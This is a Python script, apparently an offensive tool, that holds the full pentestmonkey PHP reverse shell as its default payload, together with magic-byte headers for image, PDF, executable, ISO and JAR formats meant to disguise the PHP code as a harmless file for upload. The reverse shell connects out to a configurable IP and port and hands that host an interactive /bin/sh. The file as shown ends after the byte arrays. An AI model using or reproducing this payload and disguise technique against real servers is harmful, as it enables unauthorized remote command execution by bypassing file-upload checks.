# ====================================================================================
# MIT License

# Copyright (c) 2020 Saket Upadhyay (x64mayhem)

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# ======================================================================================

from pathlib import Path
# CHANGE THIS TO YOUR OWN PAYLOAD
# This template payload is a PhP Reverse Shell, kind courtesy of http://pentestmonkey.net/tools/web-shells/php-reverse-shell

if Path("./input.php").exists():
	print("[*] input.php found, using contents of the file as payload string")
	with open("input.php","r") as phpfile:
		payload=phpfile.readlines()
else:
	print("[!] No input.php found, using hardcoded reverse_shell template")
	payload="""
	<?php

	set_time_limit (0);
	$VERSION = "1.0";
	$ip = '127.0.0.1';  // CHANGE THIS
	$port = 1234;       // CHANGE THIS
	$chunk_size = 1400;
	$write_a = null;
	$error_a = null;
	$shell = 'uname -a; w; id; /bin/sh -i';
	$daemon = 0;
	$debug = 0;



	if (function_exists('pcntl_fork')) {
		// Fork and have the parent process exit
		$pid = pcntl_fork();
		
		if ($pid == -1) {
			printit("ERROR: Can't fork");
			exit(1);
		}
		
		if ($pid) {
			exit(0);  // Parent exits
		}

		// Make the current process a session leader
		// Will only succeed if we forked
		if (posix_setsid() == -1) {
			printit("Error: Can't setsid()");
			exit(1);
		}

		$daemon = 1;
	} else {
		printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
	}

	// Change to a safe directory
	chdir("/");

	// Remove any umask we inherited
	umask(0);

	//
	// Do the reverse shell...
	//

	// Open reverse connection
	$sock = fsockopen($ip, $port, $errno, $errstr, 30);
	if (!$sock) {
		printit("$errstr ($errno)");
		exit(1);
	}

	// Spawn shell process
	$descriptorspec = array(
	0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
	1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
	2 => array("pipe", "w")   // stderr is a pipe that the child will write to
	);

	$process = proc_open($shell, $descriptorspec, $pipes);

	if (!is_resource($process)) {
		printit("ERROR: Can't spawn shell");
		exit(1);
	}

	// Set everything to non-blocking
	// Reason: Occsionally reads will block, even though stream_select tells us they won't
	stream_set_blocking($pipes[0], 0);
	stream_set_blocking($pipes[1], 0);
	stream_set_blocking($pipes[2], 0);
	stream_set_blocking($sock, 0);

	printit("Successfully opened reverse shell to $ip:$port");

	while (1) {
		// Check for end of TCP connection
		if (feof($sock)) {
			printit("ERROR: Shell connection terminated");
			break;
		}

		// Check for end of STDOUT
		if (feof($pipes[1])) {
			printit("ERROR: Shell process terminated");
			break;
		}

		// Wait until a command is end down $sock, or some
		// command output is available on STDOUT or STDERR
		$read_a = array($sock, $pipes[1], $pipes[2]);
		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

		// If we can read from the TCP socket, send
		// data to process's STDIN
		if (in_array($sock, $read_a)) {
			if ($debug) printit("SOCK READ");
			$input = fread($sock, $chunk_size);
			if ($debug) printit("SOCK: $input");
			fwrite($pipes[0], $input);
		}

		// If we can read from the process's STDOUT
		// send data down tcp connection
		if (in_array($pipes[1], $read_a)) {
			if ($debug) printit("STDOUT READ");
			$input = fread($pipes[1], $chunk_size);
			if ($debug) printit("STDOUT: $input");
			fwrite($sock, $input);
		}

		// If we can read from the process's STDERR
		// send data down tcp connection
		if (in_array($pipes[2], $read_a)) {
			if ($debug) printit("STDERR READ");
			$input = fread($pipes[2], $chunk_size);
			if ($debug) printit("STDERR: $input");
			fwrite($sock, $input);
		}
	}

	fclose($sock);
	fclose($pipes[0]);
	fclose($pipes[1]);
	fclose($pipes[2]);
	proc_close($process);

	// Like print, but does nothing if we've daemonised ourself
	// (I can't figure out how to redirect STDOUT like a proper daemon)
	function printit ($string) {
		if (!$daemon) {
			print "$string\n";
		}
	}

	?> 

	"""




## =======================================================================================
import argparse as ap
payload=payload.encode()
PNG_magicBytes = bytes([0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a,0x00,0x00,0x00,0x0d,0x49,0x48,0x44,0x52])
JPEG_magicBytes = bytes([0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,0x01,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0xFF,0xDB,0x00,0x43,0x00,0x05,0x03,0x04,0x04,0x04,0x03,0x05,0x04,0x04,0x04,0x05,0x05,0x05,0x06,0x07,0x0C,0x08,0x07,0x07,0x07,0x07,0x0F,0x0B,0x0B,0x09,0x0C,0x11,0x0F,0x12,0x12,0x11,0x0F,0x11,0x11,0x13,0x16,0x1C,0x17,0x13,0x14,0x1A,0x15,0x11,0x11,0x18,0x21,0x18,0x1A,0x1D,0x1D,0x1F,0x1F,0x1F,0x13,0x17,0x22,0x24,0x22,0x1E,0x24,0x1C,0x1E,0x1F,0x1E,0xFF,0xDB,0x00,0x43,0x01,0x05,0x05,0x05,0x07,0x06,0x07,0x0E,0x08,0x08,0x0E,0x1E,0x14,0x11,0x14,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0x1E,0xFF,0xC2,0x00,0x11,0x08,0x04,0x38,0x07,0x80,0x03,0x01,0x22,0x00,0x02,0x11,0x01,0x03,0x11,0x01,0xFF,0xC4,0x00,0x1C,0x00,0x00,0x01,0x05,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x01,0x03,0x04,0x05,0x06,0x07,0x08,0xFF,0xC4,0x00,0x19,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x03,0x04,0x05,0xFF,0xDA,0x00,0x0C,0x03,0x01,0x00,0x02,0x10,0x03,0x10,0x00,0x00,0x01,0xEF,0xAF,0xE6,0xCB,0x66,0x8B,0x54,0xB1,0x06,0x85,0x4A,0xEC,0x98,0x49,0x21,0x0B,0xB0,0xCC,0x48,0x04,0x48,0x14,0xE9,0x12])
PDF_magicBytes= bytes([0x25,0x50,0x44,0x46,0x2D,0x31,0x2E,0x33,0x20,0x0A,0x31,0x20,0x30,0x20,0x6F,0x62,0x6A,0x0A,0x3C,0x3C,0x0A,0x2F,0x50,0x61,0x67,0x65,0x73,0x20,0x32,0x20,0x30,0x20,0x52,0x0A,0x2F,0x54,0x79,0x70,0x65,0x20,0x2F,0x43,0x61,0x74,0x61,0x6C,0x6F,0x67,0x0A,0x3E,0x3E])
BMP_magicBytes = bytes([0x42,0x4D,0xB6,0xD5,0x5E,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x28,0x00,0x00,0x00,0x7F,0x07,0x00,0x00,0x37,0x04,0x00,0x00,0x01,0x00,0x18,0x00,0x00,0x00,0x00,0x00,0x80,0xD5,0x5E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])
EXE_magicBytes = bytes([0x4D,0x5A,0x50,0x00,0x02,0x00,0x00,0x00,0x04,0x00,0x0F,0x00,0xFF,0xFF,0x00,0x00,0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x1A,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0xBA,0x10,0x00,0x0E,0x1F,0xB4,0x09,0xCD,0x21,0xB8,0x01,0x4C,0xCD,0x21,0x90,0x90,0x54,0x68,0x69,0x73,0x20,0x70,0x72,0x6F,0x67,0x72,0x61,0x6D,0x20,0x6D,0x75,0x73,0x74,0x20,0x62,0x65,0x20,0x72,0x75,0x6E,0x20,0x75,0x6E,0x64,0x65,0x72,0x20,0x57,0x69,0x6E,0x33,0x32,0x0D,0x0A,0x24,0x37,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x45,0x00,0x00,0x4C,0x01,0x09,0x00,0x48,0x5E,0x44,0x4B,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xE0,0x00,0x8F,0x81,0x0B,0x01,0x02,0x19,0x00,0x54,0x01,0x00,0x00,0xEC,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x63,0x01,0x00,0x00,0x10,0x00,0x00,0x00,0x70,0x01,0x00,0x00,0x00,0x40,0x00,0x00,0x10,0x00,0x00,0x00,0x02,0x00,0x00,0x05,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xF0,0x02,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x80,0x00,0x00,0x10,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xE0,0x01,0x00,0x9E,0x0F,0x00,0x00,0x00,0x30,0x02,0x00,0x00,0xB2,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x18,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0xE3,0x01,0x00,0x4C,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2E,0x74,0x65,0x78,0x74,0x00,0x00,0x00,0x18,0x46,0x01,0x00,0x00,0x10,0x00,0x00,0x00,0x48,0x01,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x60,0x2E,0x69,0x74,0x65,0x78,0x74,0x00,0x00,0x34,0x0B,0x00,0x00,0x00,0x60,0x01,0x00,0x00,0x0C,0x00,0x00,0x00,0x4C,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])
ELF_magicBytes =bytes([0x7F,0x45,0x4C,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x3E,0x00,0x01,0x00,0x00,0x00,0x00,0x10,0x40,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x28,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x03,0x00,0x40,0x00,0x04,0x00,0x03,0x00,0x01,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0xE8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xE8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x40,0x00,0x00,0x00,0x00,0x00,0x25,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x25,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x40,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])
GIF_magicBytes = bytes([0x47,0x49,0x46,0x38,0x39,0x61,0x80,0x07,0x38,0x04,0xF7,0x1F,0x31,0x00,0x00,0x00,0x24,0x00,0x00,0x48,0x00,0x00,0x6C,0x00,0x00,0x90,0x00,0x00,0xB4,0x00,0x00,0xD8,0x00,0x00,0xFC,0x00,0x00,0x00,0x24,0x00,0x24,0x24,0x00,0x48,0x24,0x00,0x6C,0x24,0x00,0x90,0x24,0x00,0xB4,0x24,0x00,0xD8,0x24,0x00,0xFC,0x24,0x00,0x00,0x48,0x00,0x24,0x48,0x00,0x48,0x48,0x00,0x6C,0x48,0x00,0x90,0x48,0x00,0xB4,0x48,0x00,0xD8,0x48,0x00,0xFC,0x48,0x00,0x00,0x6C,0x00,0x24,0x6C,0x00,0x48,0x6C,0x00,0x6C,0x6C,0x00,0x90,0x6C,0x00,0xB4,0x6C,0x00,0xD8,0x6C,0x00,0xFC,0x6C,0x00,0x00,0x90,0x00,0x24,0x90,0x00,0x48,0x90,0x00,0x6C,0x90,0x00,0x90,0x90,0x00,0xB4,0x90,0x00,0xD8,0x90,0x00,0xFC,0x90,0x00,0x00,0xB4,0x00,0x24,0xB4,0x00,0x48,0xB4,0x00,0x6C,0xB4,0x00,0x90,0xB4,0x00,0xB4,0xB4,0x00,0xD8,0xB4,0x00,0xFC,0xB4,0x00,0x00,0xD8,0x00,0x24,0xD8,0x00,0x48,0xD8,0x00,0x6C,0xD8,0x00,0x90,0xD8,0x00,0xB4,0xD8,0x00,0xD8,0xD8,0x00,0xFC,0xD8,0x00,0x00,0xFC,0x00,0x24,0xFC,0x00,0x48,0xFC,0x00,0x6C,0xFC,0x00,0x90,0xFC,0x00,0xB4,0xFC,0x00,0xD8,0xFC,0x00,0xFC,0xFC,0x00,0x00,0x00,0x55])
ISO_magicBytes= bytes([0x45,0x52,0x08,0x00,0x00,0x00,0x90,0x90,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x33,0xED,0xFA,0x8E,0xD5,0xBC,0x00,0x7C,0xFB,0xFC,0x66,0x31,0xDB,0x66,0x31,0xC9,0x66,0x53,0x66,0x51,0x06,0x57,0x8E,0xDD,0x8E,0xC5,0x52,0xBE,0x00,0x7C,0xBF,0x00,0x06,0xB9,0x00,0x01,0xF3,0xA5,0xEA,0x4B,0x06,0x00,0x00,0x52,0xB4,0x41,0xBB,0xAA,0x55,0x31,0xC9,0x30,0xF6,0xF9,0xCD,0x13,0x72,0x16,0x81,0xFB,0x55,0xAA,0x75,0x10,0x83,0xE1,0x01,0x74,0x0B,0x66,0xC7,0x06,0xF3,0x06,0xB4,0x42,0xEB,0x15,0xEB,0x02,0x31,0xC9,0x5A,0x51,0xB4,0x08,0xCD,0x13,0x5B,0x0F,0xB6,0xC6,0x40,0x50,0x83,0xE1,0x3F,0x51,0xF7,0xE1,0x53,0x52,0x50,0xBB,0x00,0x7C,0xB9,0x04,0x00,0x66,0xA1,0xB0,0x07,0xE8,0x44,0x00,0x0F,0x82,0x80,0x00,0x66,0x40,0x80,0xC7,0x02,0xE2,0xF2,0x66,0x81,0x3E,0x40,0x7C,0xFB,0xC0,0x78,0x70,0x75,0x09,0xFA,0xBC,0xEC,0x7B,0xEA,0x44,0x7C,0x00,0x00,0xE8,0x83,0x00,0x69,0x73,0x6F,0x6C,0x69,0x6E,0x75,0x78,0x2E,0x62,0x69,0x6E,0x20,0x6D,0x69,0x73,0x73,0x69,0x6E,0x67,0x20,0x6F,0x72,0x20,0x63,0x6F,0x72,0x72,0x75,0x70,0x74,0x2E,0x0D,0x0A,0x66,0x60,0x66,0x31,0xD2,0x66,0x03,0x06,0xF8,0x7B,0x66,0x13,0x16,0xFC,0x7B,0x66,0x52,0x66,0x50,0x06,0x53,0x6A,0x01,0x6A,0x10,0x89,0xE6,0x66,0xF7,0x36,0xE8,0x7B,0xC0,0xE4,0x06,0x88,0xE1,0x88,0xC5,0x92,0xF6,0x36,0xEE,0x7B,0x88,0xC6,0x08,0xE1,0x41,0xB8,0x01,0x02,0x8A,0x16,0xF2,0x7B,0xCD,0x13,0x8D,0x64,0x10,0x66,0x61,0xC3,0xE8,0x1E,0x00,0x4F,0x70,0x65,0x72,0x61,0x74,0x69,0x6E,0x67,0x20,0x73,0x79,0x73,0x74,0x65,0x6D,0x20,0x6C,0x6F,0x61,0x64,0x20,0x65,0x72,0x72,0x6F,0x72,0x2E,0x0D,0x0A,0x5E,0xAC,0xB4,0x0E,0x8A,0x3E,0x62,0x04,0xB3,0x07,0xCD,0x10,0x3C,0x0A,0x75,0xF1,0xCD,0x18,0xF4,0xEB,0xFD,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xBF,0xE7,0xF8,0x46,0x00,0x00,0x80,0x00,0x01,0x00,0x00,0x7C,0xE0,0xFF,0x00,0x00,0x00,0x00,0x00,0x80,0x3E,0x00,0x00,0xFE,0xFF,0xFF,0xEF,0xFE,0xFF,0xFF,0xD4,0x0D,0x3E,0x00,0x40,0x1D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA,0x45,0x46,0x49,0x20,0x50,0x41,0x52,0x54,0x00,0x00,0x01,0x00,0x5C,0x00,0x00,0x00,0x18,0xC3,0xDB,0x8A,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0x7F,0x3E,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xCA,0x7F,0x3E,0x00,0x00,0x00,0x00,0x00,0xFD,0xDA,0x9E,0xE1,0x6F,0x16,0xDA,0x40,0x92,0x63,0xA8,0x12,0x45,0x5B,0x56,0x37,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xD0,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x9D,0x50,0x55,0x69,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])
JAR_magicBytes= bytes([0x50,0x4B,0x03,0x04,0x0A,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x21,0x3A,0x0E,0xB7,0x11,0xD3,0x34,0x01,0x00,0x00,0x34,0x01,0x00,0x00,0x1D,0x00,0x0A,0x00,0x4D,0x45,0x54,0x41,0x2D,0x49,0x4E,0x46,0x2F,0x63,0x6F,0x6D,0x2F,0x61,0x6E,0x64,0x72,0x6F,0x69,0x64,0x2F,0x6D,0x65,0x74,0x61,0x64,0x61,0x74,0x61,0xFE,0xCA,0x00,0x00,0x35,0xD9,0x02,0x00,0x00,0x00,0x6F,0x74,0x61,0x2D,0x70,0x72,0x6F,0x70,0x65,0x72,0x74,0x79,0x2D,0x66,0x69,0x6C,0x65,0x73,0x3D,0x6D,0x65,0x74,0x61,0x64,0x61,0x74,0x61,0x3A,0x36,0x39,0x3A,0x33,0x30,0x38,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x0A,0x6F,0x74,0x61,0x2D,0x72,0x65,0x71,0x75,0x69,0x72,0x65,0x64,0x2D,0x63,0x61,0x63,0x68,0x65,0x3D,0x30,0x0A,0x6F,0x74,0x61,0x2D,0x74,0x79,0x70,0x65,0x3D,0x42,0x4C,0x4F,0x43,0x4B,0x0A,0x70,0x6F,0x73,0x74,0x2D,0x62,0x75,0x69,0x6C,0x64,0x3D,0x67,0x6F,0x6F,0x67,0x6C,0x65,0x2F,0x61,0x6E,0x67,0x6C,0x65,0x72,0x2F,0x61,0x6E,0x67,0x6C,0x65,0x72,0x3A,0x38,0x2E,0x31,0x2E,0x30,0x2F,0x4F,0x50,0x4D,0x33,0x2E,0x31,0x37,0x31,0x30,0x31,0x39,0x2E,0x30,0x31,0x34,0x2F,0x34,0x35,0x30,0x33,0x39,0x39,0x38,0x3A,0x75,0x73,0x65,0x72,0x2F,0x72,0x65,0x6C,0x65,0x61,0x73,0x65,0x2D,0x6B,0x65,0x79,0x73,0x0A,0x70,0x6F,0x73,0x74,0x2D,0x62,0x75,0x69,0x6C,0x64,0x2D,0x69,0x6E,0x63,0x72,0x65,0x6D,0x65,0x6E,0x74,0x61,0x6C,0x3D,0x65,0x6E,0x67,0x2E,0x76,0x6F,0x69,0x64,0x7A,0x2E,0x32,0x30,0x31,0x39,0x30,0x38,0x30,0x39,0x2E,0x32,0x32,0x35,0x31,0x34,0x31,0x0A,0x70,0x6F,0x73,0x74,0x2D,0x73,0x64,0x6B,0x2D,0x6C,0x65,0x76,0x65,0x6C,0x3D,0x32,0x38,0x0A,0x70,0x6F,0x73,0x74,0x2D,0x73,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x2D,0x70,0x61,0x74,0x63,0x68,0x2D,0x6C,0x65,0x76,0x65,0x6C,0x3D,0x32,0x30,0x31,0x39,0x2D,0x30,0x38,0x2D,0x30,0x31,0x0A,0x70,0x6F,0x73,0x74,0x2D,0x74,0x69,0x6D,0x65,0x73,0x74,0x61,0x6D,0x70,0x3D,0x31,0x35,0x36,0x35,0x33,0x35,0x38,0x36,0x33,0x36,0x0A])




